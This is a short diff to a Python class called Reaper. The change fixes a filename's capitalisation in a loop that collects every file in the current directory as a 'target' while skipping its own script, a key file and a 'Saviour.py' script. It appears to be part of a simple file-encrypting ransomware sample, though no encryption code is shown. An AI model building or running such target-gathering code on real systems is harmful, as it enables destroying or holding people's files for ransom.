@@ -16,7 +16,7 @@ class Reaper:
 
     def gather_targets(self):
         for file in os.listdir():
-            if file == "Reaper.py" or file == "key.key" or file == "saviour.py":
+            if file == "Reaper.py" or file == "key.key" or file == "Saviour.py":
                 continue
 
             if os.path.isdir(file):
